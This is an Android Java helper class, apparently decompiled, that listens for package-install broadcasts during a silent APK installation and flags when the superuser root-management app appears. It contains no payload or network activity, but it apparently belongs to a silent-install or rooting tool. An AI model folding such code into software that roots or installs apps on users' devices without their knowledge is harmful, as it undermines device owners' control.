package com.demo.utils;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;

/**
 * Created by Administrator on 2016/11/23.
 * <p>
 * 静默安装的动态注册权限广播
 */

public class PkgAddBroadcastReciver extends BroadcastReceiver {
    static BroadcastReceiver instance;
    private static boolean b;

    public PkgAddBroadcastReciver() {
        b = false;
    }

    /**
     * 静默安装apk文件，动态权限注册
     */
    public static void registerPermission(Context context) {
        instance = new PkgAddBroadcastReciver();
        IntentFilter v0 = new IntentFilter();
        v0.addAction("android.intent.action.PACKAGE_ADDED");
        v0.addAction("android.intent.action.PACKAGE_REPLACED");
        v0.addDataScheme("package");
        LogUtil.e("PkgAddBroadcastReceiver.register()");
        context.registerReceiver(instance, v0);
    }
    /**
     * 取消注册广播
     **/
    public static void unRegisterPermission(Context context) {
        LogUtil.e("PkgAddBroadcastReceiver.waitForReceiveAndUnRegister....");
        if (instance != null && b) {
            int v0 = 0;
            do {
                boolean v1 = a();
                LogUtil.e("PkgAddBroadcastReceiver.wait...." + v0 + ", tid = " + Thread.currentThread().getId());
                if (b) {
                    break;
                }

                if (v1) {
                    break;
                }
                ++v0;
            }
            while (v0 < 15);
            LogUtil.e("PkgAddBroadcastReceiver.timeout....");
            if(instance != null) {
                context.unregisterReceiver(instance);
              instance = null;
            }
            LogUtil.e("PkgAddBroadcastReceiver.unregister()");
        }
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        String v0 = intent.getAction();
        if (("android.intent.action.PACKAGE_ADDED".equals(v0)) || ("android.intent.action.PACKAGE_REPLACED".equals(v0))) {
            v0 = intent.getDataString();
            LogUtil.e("PkgAddBroadcastReceiver.onReceive() packageName = " + v0);
            if ("package:com.koushikdutta.superuser".equals(v0)) {
                this.b = true;
            }
        }

    }

    public static boolean a() {
        boolean v0_2;
        long v0 = 1000;
        try {
            Thread.sleep(v0);
            v0_2 = false;
        } catch (InterruptedException v0_1) {
            v0_2 = true;
        }

        return v0_2;
    }


}
